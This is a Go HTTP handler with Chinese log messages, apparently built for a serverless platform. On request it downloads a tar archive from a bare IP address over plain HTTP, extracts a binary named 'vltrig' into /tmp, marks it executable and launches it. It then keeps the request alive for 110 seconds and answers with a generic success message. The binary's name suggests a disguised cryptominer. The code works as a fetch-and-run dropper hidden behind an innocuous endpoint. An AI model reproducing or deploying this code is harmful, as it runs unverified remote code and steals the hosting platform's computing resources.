package handler

import (
	"archive/tar"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	mu        sync.Mutex
	isRunning bool
)

func Handler(w http.ResponseWriter, r *http.Request) {
	log.Println("[INFO] --- 收到新请求 ---")
	binPath := "/tmp/vltrig"

	// 1. 文件复用检测
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		log.Println("[INFO] 未检测到可执行文件，开始下载并解压...")
		if err := downloadAndExtract(binPath); err != nil {
			log.Printf("[ERROR] 下载或解压失败: %v\n", err)
			http.Error(w, "下载或解压失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		log.Println("[INFO] 下载解压完成，开始赋权...")
		if err := os.Chmod(binPath, 0755); err != nil {
			log.Printf("[ERROR] 赋权失败: %v\n", err)
			http.Error(w, "赋权执行权限失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		log.Println("[INFO] 赋权成功: 0755")
	} else {
		log.Println("[INFO] 检测到文件已存在，跳过下载环节。")
	}

	// 2. 进程状态检测与启动
	mu.Lock()
	if !isRunning {
		log.Println("[INFO] 程序未运行，准备启动 vltrig...")
		cmd := exec.Command(binPath)
		
		// 捕获程序的标准输出和错误输出，方便在日志里看它有没有报错
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if err := cmd.Start(); err != nil {
			mu.Unlock()
			log.Printf("[ERROR] 启动二进制程序失败: %v\n", err)
			http.Error(w, "启动程序失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		
		isRunning = true
		log.Printf("[INFO] vltrig 启动成功，PID: %d\n", cmd.Process.Pid)
		
		// 监控协程
		go func(c *exec.Cmd) {
			err := c.Wait()
			mu.Lock()
			isRunning = false
			mu.Unlock()
			if err != nil {
				log.Printf("[WARN] vltrig 进程退出，伴随错误: %v\n", err)
			} else {
				log.Println("[INFO] vltrig 进程正常执行完毕退出。")
			}
		}(cmd)
	} else {
		log.Println("[INFO] 程序已在运行中，跳过启动环节。")
	}
	mu.Unlock()

	// 3. 挂起等待
	log.Println("[INFO] 开始挂起等待，预计 110 秒...")
	
	// 使用分段 Sleep，防止一直无响应
	// 这样能在挂起过程中输出日志，证明程序没死
	for i := 1; i <= 11; i++ {
		time.Sleep(10 * time.Second)
		log.Printf("[INFO] 已挂起等待 %d0 秒...", i)
	}

	// 4. 响应成功
	log.Println("[INFO] 110秒等待完成，准备返回响应。")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "success",
		"message": "接口已成功挂起 110 秒，程序状态检查完成",
	})
}

func downloadAndExtract(binPath string) error {
	// 【关键修复】加入 15 秒超时时间，防止网络不通导致无限挂死！
	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	log.Println("[INFO] 发起 HTTP GET 请求: http://94.131.19.66/vltrig.tar")
	resp, err := client.Get("http://94.131.19.66/vltrig.tar")
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New("HTTP状态码非200: " + resp.Status)
	}

	log.Println("[INFO] HTTP 请求成功，开始流式解压 tar 包...")
	tr := tar.NewReader(resp.Body)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return errors.New("读取 tar 包失败: " + err.Error())
		}

		if hdr.Name == "vltrig" || strings.HasSuffix(hdr.Name, "/vltrig") {
			log.Println("[INFO] 找到目标文件，准备写入磁盘...")
			outFile, err := os.OpenFile(binPath, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
			if err != nil {
				return err
			}
			_, err = io.Copy(outFile, tr)
			outFile.Close()
			if err != nil {
				return err
			}
			log.Println("[INFO] 文件写入成功。")
			return nil
		}
	}
	return errors.New("未在 tar 包中找到 vltrig 程序")
}